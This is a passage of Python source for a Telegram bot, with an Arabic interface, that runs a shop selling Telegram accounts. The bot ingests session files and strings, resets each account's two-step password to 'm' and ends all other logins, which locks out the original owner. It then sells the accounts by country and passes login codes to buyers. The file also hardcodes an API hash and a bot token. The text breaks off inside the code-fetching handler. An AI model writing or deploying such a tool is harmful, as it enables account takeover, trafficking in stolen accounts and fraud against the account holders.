import asyncio
import os
import re
import shutil
import sqlite3
import time
import uuid
import zipfile
from telethon import Button, TelegramClient, events, types
from telethon.errors import (
    AuthKeyUnregisteredError,
    FloodWaitError,
    PasswordHashInvalidError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    SessionPasswordNeededError,
    RPCError,
)
from telethon.sessions import StringSession
from telethon.tl import functions

# === بيانات الاعتماد ===
API_ID = 23032698
API_HASH = "99ad65a5fcd38203621cb20acd2aaba5"
BOT_TOKEN = "8968047291:AAHs7bB2VNfIn2Aa44MrwaWfceQgtbiGhnw"
ADMIN_ID = 1407216610

DEFAULT_PRICE = 1000
DEFAULT_2FA_PASSWORD = "m"

CHECK_INTERVAL_SECONDS = 30
CONNECT_TIMEOUT = 10

SESSIONS_DIR = "./sessions/"
TEMP_DIR = "./temp_extract/"
os.makedirs(SESSIONS_DIR, exist_ok=True)
os.makedirs(TEMP_DIR, exist_ok=True)

buy_lock = asyncio.Lock()
db_lock = asyncio.Lock()
last_otp_request = {}

user_login_state = {}

# === قائمة الدول المعتمدة للتعرف على الرموز ===
COUNTRY_CODES = {
    "964": ("العراق", "🇮🇶"),
    "966": ("السعودية", "🇸🇦"),
    "967": ("اليمن", "🇾🇪"),
    "20": ("مصر", "🇪🇬"),
    "962": ("الأردن", "🇯🇴"),
    "961": ("لبنان", "🇱🇧"),
    "963": ("سوريا", "🇸🇾"),
    "970": ("فلسطين", "🇵🇸"),
    "965": ("الكويت", "🇰🇼"),
    "971": ("الإمارات", "🇦🇪"),
    "974": ("قطر", "🇶🇦"),
    "973": ("البحرين", "🇧🇭"),
    "968": ("عُمان", "🇴🇲"),
    "212": ("المغرب", "🇲🇦"),
    "213": ("الجزائر", "🇩🇿"),
    "216": ("تونس", "🇹🇳"),
    "218": ("ليبيا", "🇱🇾"),
    "249": ("السودان", "🇸🇩"),
    "252": ("الصومال", "🇸🇴"),
    "253": ("جيبوتي", "🇩🇯"),
    "222": ("موريتانيا", "🇲🇷"),
    "269": ("جزر القمر", "🇰🇲"),
    "90": ("تركيا", "🇹🇷"),
    "98": ("إيران", "🇮🇷"),
    "91": ("الهند", "🇮🇳"),
    "92": ("باكستان", "🇵🇰"),
    "880": ("بنغلاديش", "🇧🇩"),
    "86": ("الصين", "🇨🇳"),
    "81": ("اليابان", "🇯🇵"),
    "82": ("كوريا الجنوبية", "🇰🇷"),
    "62": ("إندونيسيا", "🇮🇩"),
    "60": ("ماليزيا", "🇲🇾"),
    "63": ("الفلبين", "🇵🇭"),
    "66": ("تايلاند", "🇹🇭"),
    "84": ("فيتنام", "🇻🇳"),
    "44": ("المملكة المتحدة", "🇬🇧"),
    "49": ("ألمانيا", "🇩🇪"),
    "33": ("فرنسا", "🇫🇷"),
    "39": ("إيطاليا", "🇮🇹"),
    "34": ("إسبانيا", "🇪🇸"),
    "7": ("روسيا / كازاخستان", "🇷🇺"),
    "380": ("أوكرانيا", "🇺🇦"),
    "48": ("بولندا", "🇵🇱"),
    "31": ("هولندا", "🇳🇱"),
    "32": ("بلجيكا", "🇧🇪"),
    "41": ("سويسرا", "🇨🇭"),
    "43": ("النمسا", "🇦🇹"),
    "46": ("السويد", "🇸🇪"),
    "47": ("النرويج", "🇳🇴"),
    "45": ("الدنمارك", "🇩🇰"),
    "358": ("فنلندا", "🇫🇮"),
    "351": ("البرتغال", "🇵🇹"),
    "30": ("اليونان", "🇬🇷"),
    "1": ("أمريكا / كندا", "🇺🇸"),
    "52": ("المكسيك", "🇲🇽"),
    "55": ("البرازيل", "🇧🇷"),
    "54": ("الأرجنتين", "🇦🇷"),
    "57": ("كولومبيا", "🇨🇴"),
    "234": ("نيجيريا", "🇳🇬"),
    "27": ("جنوب إفريقيا", "🇿🇦"),
    "254": ("كينيا", "🇰🇪"),
    "233": ("غانا", "🇬🇭"),
    "61": ("أستراليا", "🇦🇺"),
    "64": ("نيوزيلندا", "🇳🇿"),
}

# === قاعدة البيانات ===
conn = sqlite3.connect("bot_data.db", check_same_thread=False, timeout=30)
cursor = conn.cursor()

def init_db():
    cursor.execute("""
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        balance INTEGER DEFAULT 0
    )
    """)

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        file_name TEXT NOT NULL UNIQUE,
        phone_number TEXT DEFAULT '',
        country_code TEXT DEFAULT 'other',
        password_2fa TEXT DEFAULT 'm',
        status TEXT DEFAULT 'available',
        buyer_id INTEGER DEFAULT 0,
        is_spammed INTEGER DEFAULT 0,
        session_data TEXT DEFAULT ''
    )
    """)

    try:
        cursor.execute("ALTER TABLE sessions ADD COLUMN session_data TEXT DEFAULT ''")
        conn.commit()
    except sqlite3.OperationalError:
        pass

    cursor.execute("""
    CREATE TABLE IF NOT EXISTS country_prices (
        country_code TEXT PRIMARY KEY,
        price INTEGER NOT NULL
    )
    """)
    conn.commit()

init_db()


# === دوال مساعدة ===
async def get_balance_async(user_id):
    async with db_lock:
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        row = cursor.fetchone()
        if row:
            return row[0]
        cursor.execute("INSERT INTO users (user_id, balance) VALUES (?, ?)", (user_id, 0))
        conn.commit()
        return 0


async def update_balance_async(user_id, amount):
    async with db_lock:
        cursor.execute("UPDATE users SET balance = balance + ? WHERE user_id = ?", (amount, user_id))
        conn.commit()


async def get_country_price_async(code):
    async with db_lock:
        cursor.execute("SELECT price FROM country_prices WHERE country_code = ?", (code,))
        row = cursor.fetchone()
        return row[0] if row else DEFAULT_PRICE


async def set_country_price_async(code, price):
    async with db_lock:
        cursor.execute(
            "INSERT INTO country_prices (country_code, price) VALUES (?, ?) ON CONFLICT(country_code) DO UPDATE SET price = ?",
            (code, price, price),
        )
        conn.commit()


def parse_country_code(phone):
    clean = re.sub(r"\D", "", str(phone))
    for code in sorted(COUNTRY_CODES.keys(), key=lambda x: len(x), reverse=True):
        if clean.startswith(code):
            info = COUNTRY_CODES[code]
            return code, info[0], info[1]
    return "other", "دولة أخرى", "🌐"


async def check_spam_status(client):
    try:
        res = await asyncio.wait_for(
            client(functions.messages.GetPeerDialogsRequest(peers=["spambot"])),
            timeout=CONNECT_TIMEOUT,
        )
        if res and res.messages:
            txt = res.messages[0].message.lower()
            if "good news" in txt or "free" in txt or "لا توجد قيود" in txt:
                return False, "🟢 الحساب سليم"
            return True, "⚠️ الحساب عليه قيود (سبام)"
    except Exception:
        pass
    return False, "🟢 الحساب سليم"


async def terminate_other_sessions(client):
    try:
        authorizations = await asyncio.wait_for(
            client(functions.account.GetAuthorizationsRequest()),
            timeout=CONNECT_TIMEOUT,
        )
        for auth in authorizations.authorizations:
            if not auth.current:
                try:
                    await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
                except Exception:
                    pass
    except Exception:
        pass


async def set_2fa_password(client, current_pwd="", new_pwd=DEFAULT_2FA_PASSWORD):
    try:
        current_pwd = current_pwd.strip() if current_pwd else ""
        new_pwd = new_pwd.strip()
        await client.edit_2fa_password(current_password=current_pwd, new_password=new_pwd)
        return True
    except Exception:
        return False


async def safe_get_messages(client, entity, limit=1):
    try:
        return await asyncio.wait_for(client.get_messages(entity, limit=limit), timeout=CONNECT_TIMEOUT)
    except Exception:
        return []


# === معالجة السيشن المضاف ===
async def process_client_instance(temp_client, unique_file_name, session_str=""):
    try:
        await asyncio.wait_for(temp_client.connect(), timeout=CONNECT_TIMEOUT)

        if not await temp_client.is_user_authorized():
            await temp_client.disconnect()
            return "unauthorized", "السيشن غير مسجل دخول", "", False

        me = await temp_client.get_me()
        phone_num = f"+{me.phone}" if me and me.phone else "غير معروف"
        c_code, _, _ = parse_country_code(phone_num)
        is_spammed, _ = await check_spam_status(temp_client)

        try:
            await set_2fa_password(temp_client, current_pwd="", new_pwd=DEFAULT_2FA_PASSWORD)
        except Exception:
            pass

        try:
            await terminate_other_sessions(temp_client)
        except Exception:
            pass

        await temp_client.disconnect()

        async with db_lock:
            cursor.execute(
                "INSERT OR REPLACE INTO sessions (file_name, phone_number, country_code, password_2fa, is_spammed, status, session_data) VALUES (?, ?, ?, ?, ?, 'available', ?)",
                (
                    unique_file_name,
                    phone_num,
                    c_code,
                    DEFAULT_2FA_PASSWORD,
                    1 if is_spammed else 0,
                    session_str,
                ),
            )
            conn.commit()

        return "success", phone_num, DEFAULT_2FA_PASSWORD, is_spammed
    except Exception as e:
        try:
            if temp_client.is_connected():
                await temp_client.disconnect()
        except Exception:
            pass
        return "error", str(e), "", False


async def process_single_file_session(file_path, unique_file_name):
    temp_client = TelegramClient(file_path, API_ID, API_HASH)
    return await process_client_instance(temp_client, unique_file_name)


async def process_single_string_session(session_str):
    unique_id = f"str_{uuid.uuid4().hex[:10]}_{int(time.time_ns())}"
    temp_client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
    return await process_client_instance(temp_client, unique_id, session_str=session_str)


# === معالج الفحص الدوري ===
async def session_heartbeat_checker(bot):
    while True:
        await asyncio.sleep(CHECK_INTERVAL_SECONDS)
        async with db_lock:
            cursor.execute("SELECT id, file_name, session_data FROM sessions WHERE status = 'available'")
            rows = cursor.fetchall()

        for s_id, f_name, s_data in rows:
            if s_data:
                tc = TelegramClient(StringSession(s_data), API_ID, API_HASH)
            else:
                f_path = os.path.join(SESSIONS_DIR, f_name)
                if not os.path.exists(f_path):
                    async with db_lock:
                        cursor.execute("DELETE FROM sessions WHERE id = ?", (s_id,))
                        conn.commit()
                    continue
                tc = TelegramClient(f_path, API_ID, API_HASH)

            try:
                await asyncio.wait_for(tc.connect(), timeout=CONNECT_TIMEOUT)
                if not await tc.is_user_authorized():
                    async with db_lock:
                        cursor.execute("UPDATE sessions SET status = 'dead' WHERE id = ?", (s_id,))
                        conn.commit()
                await tc.disconnect()
            except Exception:
                async with db_lock:
                    cursor.execute("UPDATE sessions SET status = 'dead' WHERE id = ?", (s_id,))
                    conn.commit()


# === تسجيل الأحداث والأوامر ===
def register_handlers(bot):

    @bot.on(events.NewMessage(pattern="/start"))
    async def start(event):
        user_id = event.sender_id
        balance = await get_balance_async(user_id)
        buttons = [
            [Button.inline("🛒 شراء رقم / حساب", data=b"show_numbers")],
            [Button.inline(f"💰 رصيدك: {balance} د.ع", data=b"check_balance")],
        ]
        await event.respond(
            "👋 أهلاً بك في بوت بيع الحسابات والسيشنات.\nاختر من القائمة أدناه:",
            buttons=buttons,
        )

    @bot.on(events.NewMessage(pattern="/admin"))
    async def admin_panel(event):
        if event.sender_id != ADMIN_ID:
            return
        async with db_lock:
            cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'available'")
            available = cursor.fetchone()[0]
            cursor.execute("SELECT COUNT(*) FROM sessions WHERE status = 'sold'")
            sold = cursor.fetchone()[0]

        msg = (
            "⚙️️ **لوحة تحكم الأدمن**\n\n"
            f"📦 **السيشنات المتاحة:** `{available}`\n"
            f"🛍 **السيشنات المباعة:** `{sold}`\n\n"
            "📌 **التحكم بالرصيد والحسابات:**\n"
            "• `/login` : **تسجيل حساب يدوي برقم وكود.**\n"
            "• `/add ID AMOUNT` : إضافة رصيد لمستخدم.\n"
            "• `/deduct ID AMOUNT` : سحب رصيد من مستخدم.\n"
            "• `/setprice CODE PRICE` : لتحديد سعر دولة.\n"
            "• `/reset_bot` : تصفير البوت بالكامل.\n\n"
            "📌 **طرق الإضافة السريعة:**\n"
            "• ارفع ملف `.session` أو أرشيف `.zip`.\n"
            "• أرسل **أكواد السيشن (String Sessions)** مباشرة."
        )
        buttons = [[Button.inline("⚠️ تصفير البوت بالكامل", data=b"confirm_reset_ask")]]
        await event.respond(msg, buttons=buttons)

    # === ميزة تسجيل الحساب يدوي خطوة بخطوة ===
    @bot.on(events.NewMessage(pattern="/login"))
    async def manual_login_start(event):
        if event.sender_id != ADMIN_ID:
            return
        user_login_state[ADMIN_ID] = {"step": "WAITING_PHONE"}
        await event.reply("📱 **يرجى إرسال رقم الهاتف مع رمز الدولة:**\nمثال: `+9647700000000`\n\n(للإلغاء أرسل /cancel)")

    @bot.on(events.NewMessage(pattern="/cancel"))
    async def manual_login_cancel(event):
        if event.sender_id != ADMIN_ID:
            return
        if ADMIN_ID in user_login_state:
            client = user_login_state[ADMIN_ID].get("client")
            if client:
                try:
                    await client.disconnect()
                except Exception:
                    pass
            del user_login_state[ADMIN_ID]
            await event.reply("❌ تم إلغاء عملية التسجيل اليدوي.")

    @bot.on(events.NewMessage(pattern=r"/add (\d+) (\d+)"))
    async def add_funds(event):
        if event.sender_id != ADMIN_ID:
            return
        target_id = int(event.pattern_match.group(1))
        amount = int(event.pattern_match.group(2))
        await update_balance_async(target_id, amount)
        new_bal = await get_balance_async(target_id)
        await event.reply(f"✅ تم إضافة `{amount}` د.ع لـ `{target_id}`.\n💰 الرصيد الحالي: `{new_bal}` د.ع.")

    @bot.on(events.NewMessage(pattern=r"/deduct (\d+) (\d+)"))
    async def deduct_funds(event):
        if event.sender_id != ADMIN_ID:
            return
        target_id = int(event.pattern_match.group(1))
        amount = int(event.pattern_match.group(2))
        current_bal = await get_balance_async(target_id)

        if current_bal < amount:
            await update_balance_async(target_id, -current_bal)
            actual_deducted = current_bal
        else:
            await update_balance_async(target_id, -amount)
            actual_deducted = amount

        new_bal = await get_balance_async(target_id)
        await event.reply(f"🔻 تم سحب `{actual_deducted}` د.ع من المستخدَم `{target_id}`.\n💰 الرصيد المتبقي: `{new_bal}` د.ع.")

    @bot.on(events.NewMessage(pattern="/reset_bot"))
    async def reset_bot_cmd(event):
        if event.sender_id != ADMIN_ID:
            return
        buttons = [
            [Button.inline("🚨 نعم، قم بالتصفير الحتمي", data=b"do_full_reset")],
            [Button.inline("❌ إلغاء", data=b"start_back")],
        ]
        await event.reply(
            "⚠️ **تحذير خطير جداً!**\n\nهل أنت متأكد من تصفير البوت بالكامل؟",
            buttons=buttons,
        )

    @bot.on(events.NewMessage(pattern=r"/setprice (\w+) (\d+)"))
    async def set_price_cmd(event):
        if event.sender_id != ADMIN_ID:
            return
        code = event.pattern_match.group(1).replace("+", "")
        price = int(event.pattern_match.group(2))
        await set_country_price_async(code, price)
        country_info = COUNTRY_CODES.get(code, ("دولة", "🌐"))
        await event.reply(f"✅ تم تحديد سعر {country_info[1]} {country_info[0]} (+{code}) بـ `{price}` د.ع.")

    @bot.on(events.NewMessage)
    async def handle_input(event):
        if event.sender_id != ADMIN_ID:
            return

        if ADMIN_ID in user_login_state and not event.text.startswith("/"):
            state = user_login_state[ADMIN_ID]["step"]

            if state == "WAITING_PHONE":
                phone = event.text.strip()
                unique_file = f"{uuid.uuid4().hex[:8]}_{int(time.time())}.session"
                file_path = os.path.join(SESSIONS_DIR, unique_file)
                client = TelegramClient(file_path, API_ID, API_HASH)

                await client.connect()
                try:
                    res = await client.send_code_request(phone)
                    user_login_state[ADMIN_ID] = {
                        "step": "WAITING_CODE",
                        "client": client,
                        "phone": phone,
                        "phone_code_hash": res.phone_code_hash,
                        "file_name": unique_file,
                        "file_path": file_path
                    }
                    await event.reply("📩 **تم إرسال كود التحقق.**\nيرجى إرسال الكود الذي وصلك الآن:")
                except Exception as e:
                    await client.disconnect()
                    if os.path.exists(file_path):
                        os.remove(file_path)
                    del user_login_state[ADMIN_ID]
                    await event.reply(f"❌ **فشل طلب الكود:** {str(e)}")
                return

            elif state == "WAITING_CODE":
                code = event.text.strip()
                data = user_login_state[ADMIN_ID]
                client = data["client"]

                try:
                    await client.sign_in(data["phone"], code, phone_code_hash=data["phone_code_hash"])
                    await complete_manual_login(event, data, "")
                except SessionPasswordNeededError:
                    user_login_state[ADMIN_ID]["step"] = "WAITING_2FA"
                    await event.reply("🔒 **الحساب يحتوي على تحقق بخطوتين (2FA).**\nيرجى إرسال كلمة السر الآن:")
                except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                    await event.reply("❌ الكود غير صحيح أو منتهي الصلاحية، أعد إرساله:")
                except Exception as e:
                    await client.disconnect()
                    if os.path.exists(data["file_path"]):
                        os.remove(data["file_path"])
                    del user_login_state[ADMIN_ID]
                    await event.reply(f"❌ **فشل التسجيل:** {str(e)}")
                return

            elif state == "WAITING_2FA":
                password = event.text.strip()
                data = user_login_state[ADMIN_ID]
                client = data["client"]

                try:
                    await client.sign_in(password=password)
                    await complete_manual_login(event, data, password)
                except PasswordHashInvalidError:
                    await event.reply("❌ كلمة السر غير صحيحة، حاول مجدداً:")
                except Exception as e:
                    await client.disconnect()
                    if os.path.exists(data["file_path"]):
                        os.remove(data["file_path"])
                    del user_login_state[ADMIN_ID]
                    await event.reply(f"❌ **فشل التسجيل:** {str(e)}")
                return

        if event.text and not event.document and not event.text.startswith("/"):
            found_strings = re.findall(r"1[A-Za-z0-9+/=_-]{100,}", event.text)
            if found_strings:
                status_msg = await event.reply(f"⏳ جاري قبول واستخراج `{len(found_strings)}` كود سيشن...")
                added, spammed, failed = 0, 0, 0

                for s_str in found_strings:
                    status, _, _, is_spammed = await process_single_string_session(s_str)
                    if status == "success":
                        added += 1
                        if is_spammed:
                            spammed += 1
                    else:
                        failed += 1

                await status_msg.edit(
                    f"✅ **اكتملت معالجة الأكواد النصية!**\n\n"
                    f"📥 مضافة للبيع: `{added}`\n"
                    f"⚠️ منها سبام: `{spammed}`\n"
                    f"❌ معطلة / غير صالحة: `{failed}`"
                )
                return

        if event.document and event.file.name:
            file_name = event.file.name.lower()

            if file_name.endswith(".txt"):
                status_msg = await event.reply("📄 جاري قراءة الملف النصي واستخراج الأكواد...")
                txt_path = os.path.join(TEMP_DIR, f"txt_{uuid.uuid4().hex[:8]}.txt")
                await event.download_media(txt_path)

                try:
                    with open(txt_path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                    found_strings = re.findall(r"1[A-Za-z0-9+/=_-]{100,}", content)
                except Exception as e:
                    await status_msg.edit(f"❌ خطأ في قراءة الملف: {str(e)}")
                    if os.path.exists(txt_path):
                        os.remove(txt_path)
                    return

                if os.path.exists(txt_path):
                    os.remove(txt_path)

                if not found_strings:
                    await status_msg.edit("❌ لم يتم العثور على أي أكواد سيشن معتمدة داخل الملف النصي!")
                    return

                await status_msg.edit(f"⏳ تم العثور على `{len(found_strings)}` كود، جاري الإضافة...")
                added, spammed, failed = 0, 0, 0

                for s_str in found_strings:
                    status, _, _, is_spammed = await process_single_string_session(s_str)
                    if status == "success":
                        added += 1
                        if is_spammed:
                            spammed += 1
                    else:
                        failed += 1

                await status_msg.edit(
                    f"✅ **اكتملت معالجة الأكواد من الملف النصي!**\n\n"
                    f"📥 مضافة للبيع: `{added}`\n"
                    f"⚠️ منها سبام: `{spammed}`\n"
                    f"❌ معطلة / غير صالحة: `{failed}`"
                )

            elif file_name.endswith(".zip"):
                status_msg = await event.reply("📦 جاري تنزيل الملف المضغوط واستخراج السيشنات...")

                uid = uuid.uuid4().hex[:8]
                extract_folder = os.path.join(TEMP_DIR, f"extract_{uid}")
                zip_path = os.path.join(TEMP_DIR, f"file_{uid}.zip")

                os.makedirs(TEMP_DIR, exist_ok=True)
                os.makedirs(extract_folder, exist_ok=True)

                try:
                    await event.download_media(zip_path)
                    with zipfile.ZipFile(zip_path, "r") as zip_ref:
                        zip_ref.extractall(extract_folder)
                except Exception as e:
                    await status_msg.edit(f"❌ **الملف المضغوط معطوب أو غير صالح:** {str(e)}")
                    if os.path.exists(zip_path):
                        os.remove(zip_path)
                    shutil.rmtree(extract_folder, ignore_errors=True)
                    return

                found_sessions = []
                for root, _, files in os.walk(extract_folder):
                    for f in files:
                        if f.lower().endswith(".session"):
                            found_sessions.append(os.path.join(root, f))

                if not found_sessions:
                    await status_msg.edit("❌ **لم يتم العثور على أي ملفات `.session` داخل الأرشيف!**")
                    if os.path.exists(zip_path):
                        os.remove(zip_path)
                    shutil.rmtree(extract_folder, ignore_errors=True)
                    return

                await status_msg.edit(f"📦 تم العثور على `{len(found_sessions)}` سيشن، جاري الإضافة...")

                added_count, spammed_count, failed_count = 0, 0, 0

                for src_path in found_sessions:
                    base_name = os.path.basename(src_path)
                    unique_id = f"{uuid.uuid4().hex[:10]}_{int(time.time_ns())}"
                    unique_file_name = f"{unique_id}_{base_name}"
                    dest_path = os.path.join(SESSIONS_DIR, unique_file_name)

                    try:
                        shutil.copy2(src_path, dest_path)
                    except Exception:
                        failed_count += 1
                        continue

                    status, _, _, is_spammed = await process_single_file_session(dest_path, unique_file_name)

                    if status == "success":
                        added_count += 1
                        if is_spammed:
                            spammed_count += 1
                    else:
                        failed_count += 1
                        if os.path.exists(dest_path):
                            try:
                                os.remove(dest_path)
                            except Exception:
                                pass

                if os.path.exists(zip_path):
                    os.remove(zip_path)
                shutil.rmtree(extract_folder, ignore_errors=True)

                await status_msg.edit(
                    f"✅ **اكتملت معالجة الأرشيف!**\n\n"
                    f"📥 مضافة للبيع: `{added_count}`\n"
                    f"⚠️ منها سبام: `{spammed_count}`\n"
                    f"❌ معطلة / تالفة: `{failed_count}`"
                )

            elif file_name.endswith(".session"):
                status_msg = await event.reply("⏳ جاري إضافة ملف السيشن...")
                unique_id = f"{uuid.uuid4().hex[:8]}_{int(time.time_ns())}"
                unique_file_name = f"{unique_id}_{file_name}"
                file_path = os.path.join(SESSIONS_DIR, unique_file_name)

                await event.download_media(file_path)
                status, res1, res2, is_spammed = await process_single_file_session(file_path, unique_file_name)

                if status == "success":
                    spam_str = "⚠️ **(سبام)**" if is_spammed else "🟢 **(سليم)**"
                    await status_msg.edit(
                        f"✅ **تم إضافة السيشن!**\n📱 الرقم: `{res1}`\n🔑 2FA للمشتري: `m`\nالحالة: {spam_str}"
                    )
                else:
                    if os.path.exists(file_path):
                        try:
                            os.remove(file_path)
                        except Exception:
                            pass
                    await status_msg.edit(f"❌ **فشلت معالجة الحساب:** {res1}")

    async def complete_manual_login(event, data, current_2fa):
        client = data["client"]
        phone_num = data["phone"]
        unique_file_name = data["file_name"]

        is_spammed, _ = await check_spam_status(client)
        c_code, _, _ = parse_country_code(phone_num)

        try:
            await set_2fa_password(client, current_pwd=current_2fa, new_pwd=DEFAULT_2FA_PASSWORD)
        except Exception:
            pass

        try:
            await terminate_other_sessions(client)
        except Exception:
            pass

        await client.disconnect()

        async with db_lock:
            cursor.execute(
                "INSERT OR REPLACE INTO sessions (file_name, phone_number, country_code, password_2fa, is_spammed, status, session_data) VALUES (?, ?, ?, ?, ?, 'available', '')",
                (
                    unique_file_name,
                    phone_num,
                    c_code,
                    DEFAULT_2FA_PASSWORD,
                    1 if is_spammed else 0,
                ),
            )
            conn.commit()

        del user_login_state[ADMIN_ID]
        spam_str = "⚠️️ **(سبام)**" if is_spammed else "🟢 **(سليم)**"
        await event.reply(
            f"✅ **تم تسجيل الحساب وإضافته للمتجر بنجاح!**\n\n"
            f"📱 الرقم: `{phone_num}`\n"
            f"🔑 كلمة 2FA للمشتري: `m`\n"
            f"الحالة: {spam_str}"
        )

    # === أزرار الشراء والتفاعل ===
    @bot.on(events.CallbackQuery)
    async def callback_handler(event):
        user_id = event.sender_id
        data = event.data

        if data == b"confirm_reset_ask":
            if user_id != ADMIN_ID:
                return
            buttons = [
                [Button.inline("🚨 نعم، قم بالتصفير الحتمي", data=b"do_full_reset")],
                [Button.inline("❌ إلغاء", data=b"start_back")],
            ]
            await event.edit(
                "⚠️️ **تحذير خطير جداً!**\n\nهل أنت متأكد من تصفير البوت بالكامل؟",
                buttons=buttons,
            )
            return

        if data == b"do_full_reset":
            if user_id != ADMIN_ID:
                return
            async with db_lock:
                cursor.execute("DROP TABLE IF EXISTS users")
                cursor.execute("DROP TABLE IF EXISTS sessions")
                cursor.execute("DROP TABLE IF EXISTS country_prices")
                conn.commit()
                init_db()

            if os.path.exists(SESSIONS_DIR):
                shutil.rmtree(SESSIONS_DIR)
                os.makedirs(SESSIONS_DIR, exist_ok=True)

            if os.path.exists(TEMP_DIR):
                shutil.rmtree(TEMP_DIR)
                os.makedirs(TEMP_DIR, exist_ok=True)

            await event.edit("💥 **تم تصفير البوت ومسح جميع البيانات والسيشنات بنجاح!**")
            return

        if data == b"check_balance":
            balance = await get_balance_async(user_id)
            await event.answer(f"💰 رصيدك الحالي: {balance} د.ع", alert=True)
            return

        # === قائمة الأرقام المتاحة مباشرةً (بدون قارات) ===
        if data == b"show_numbers":
            async with db_lock:
                cursor.execute("SELECT country_code, COUNT(*) FROM sessions WHERE status = 'available' GROUP BY country_code")
                rows = cursor.fetchall()

            if not rows:
                await event.answer("❌ لا تتوفر أي أرقام جاهزة للبيع حالياً!", alert=True)
                return

            buttons = []
            for code, count in rows:
                c_name, c_flag = COUNTRY_CODES.get(code, ("دولة أخرى", "🌐"))
                price = await get_country_price_async(code)
                btn_text = f"{c_flag} {c_name} (+{code}) | {price} د.ع ({count} متاح)"
                buttons.append([Button.inline(btn_text, data=f"buy_{code}".encode())])

            buttons.append([Button.inline("🔙 رجوع", data=b"start_back")])
            await event.edit("📱 **اختر الدولة لشراء رقم متاح:**", buttons=buttons)
            return

        if data == b"start_back":
            balance = await get_balance_async(user_id)
            buttons = [
                [Button.inline("🛒 شراء رقم / حساب", data=b"show_numbers")],
                [Button.inline(f"💰 رصيدك: {balance} د.ع", data=b"check_balance")],
            ]
            await event.edit(
                "👋 أهلاً بك في بوت بيع الحسابات والسيشنات.\nاختر من القائمة أدناه:",
                buttons=buttons,
            )
            return

        if data.startswith(b"buy_"):
            selected_code = data.decode().split("_")[1]
            price = await get_country_price_async(selected_code)
            balance = await get_balance_async(user_id)

            if balance < price:
                await event.answer(f"❌ رصيدك غير كافٍ! السعر {price} د.ع ورصيدك {balance} د.ع", alert=True)
                return

            country_info = COUNTRY_CODES.get(selected_code, ("دولة", "🌐"))
            confirm_buttons = [
                [Button.inline("✅ تأكيد الشراء", data=f"confirm_buy_{selected_code}".encode())],
                [Button.inline("❌ إلغاء", data=b"show_numbers")],
            ]
            await event.edit(
                f"⚠️ **تأكيد عملية الشراء**\n\n"
                f"🏳️ الدولة: {country_info[1]} {country_info[0]} (+{selected_code})\n"
                f"💵 السعر: `{price}` د.ع\n"
                f"💰 رصيدك الحالي: `{balance}` د.ع\n\n"
                f"هل أنت تأكد من متابعة عملية الشراء؟",
                buttons=confirm_buttons,
            )
            return

        if data.startswith(b"confirm_buy_"):
            selected_code = data.decode().split("_")[2]
            price = await get_country_price_async(selected_code)
            balance = await get_balance_async(user_id)

            if balance < price:
                await event.answer("❌ رصيدك غير كافٍ!", alert=True)
                return

            async with buy_lock:
                async with db_lock:
                    cursor.execute(
                        "SELECT id, file_name, phone_number, session_data FROM sessions WHERE status = 'available' AND country_code = ? AND is_spammed = 0 LIMIT 1",
                        (selected_code,),
                    )
                    session = cursor.fetchone()
                    if not session:
                        cursor.execute(
                            "SELECT id, file_name, phone_number, session_data FROM sessions WHERE status = 'available' AND country_code = ? LIMIT 1",
                            (selected_code,),
                        )
                        session = cursor.fetchone()
                    if not session:
                        await event.answer("❌ نفذت الأرقام المتاحة لهذه الدولة!", alert=True)
                        return

                session_id, file_name, phone_num, session_data = session

                if session_data:
                    temp_client = TelegramClient(StringSession(session_data), API_ID, API_HASH)
                else:
                    file_path = os.path.join(SESSIONS_DIR, file_name)
                    if not os.path.exists(file_path):
                        async with db_lock:
                            cursor.execute("DELETE FROM sessions WHERE id = ?", (session_id,))
                            conn.commit()
                        await event.answer("❌ الملف غير موجود، حاول مجدداً", alert=True)
                        return
                    temp_client = TelegramClient(file_path, API_ID, API_HASH)

                try:
                    await asyncio.wait_for(temp_client.connect(), timeout=CONNECT_TIMEOUT)
                    is_valid = await temp_client.is_user_authorized()
                    if is_valid:
                        is_spammed, _ = await check_spam_status(temp_client)
                    else:
                        is_spammed = False
                    await temp_client.disconnect()
                except Exception:
                    is_valid = False
                    is_spammed = False

                if not is_valid:
                    async with db_lock:
                        cursor.execute("UPDATE sessions SET status = 'dead' WHERE id = ?", (session_id,))
                        conn.commit()
                    await event.answer("❌ السيشن غير صالح، تم حذفه تلقائياً", alert=True)
                    return

                await update_balance_async(user_id, -price)
                async with db_lock:
                    cursor.execute(
                        "UPDATE sessions SET status = 'sold', buyer_id = ? WHERE id = ?",
                        (user_id, session_id),
                    )
                    conn.commit()

                buttons = [
                    [Button.inline("🔄 جلب الكود", data=f"otp_{session_id}".encode())],
                    [Button.inline("🔑 جلب كلمة سر 2FA", data=f"pass_{session_id}".encode())],
                    [Button.inline("🚪 تسجيل خروج البوت", data=f"logout_{session_id}".encode())],
                ]
                spam_notice = "\n⚠️ **تنبيه:** الحساب عليه قيود مؤقتة (سبام)." if is_spammed else ""

                caption_msg = (
                    f"✅ **تم الشراء بنجاح!**{spam_notice}\n\n"
                    f"📱 **الرقم:** `{phone_num}`\n"
                    f"💵 **السعر المخصوم:** `{price}` د.ع\n\n"
                    f"*(اضغط على الرقم أعلاه لنسخه)*\n\n"
                    f"📩 اضغط على زر **(🔄 جلب الكود)** أدناه عند طلب كود التحقق."
                )

                if session_data:
                    await bot.send_message(
                        user_id,
                        caption_msg + f"\n\n🔑 **كود السيشن (String):**\n`{session_data}`",
                        buttons=buttons,
                    )
                else:
                    file_path = os.path.join(SESSIONS_DIR, file_name)
                    await bot.send_file(user_id, file_path, caption=caption_msg, buttons=buttons)

                await event.answer("✅ تم الشراء بنجاح!", alert=True)
            return

        if data.startswith(b"otp_"):
            now = time.time()
            if user_id in last_otp_request and now - last_otp_request[user_id] < 5:
                await event.answer("⏳ يرجى الانتظار 5 ثوانٍ بين كل طلب!", alert=True)
                return
            last_otp_request[user_id] = now
            session_id = data.decode().split("_")[1]

            async with db_lock:
                cursor.execute("SELECT file_name, session_data FROM sessions WHERE id = ?", (session_id,))
                row = cursor.fetchone()

            if row:
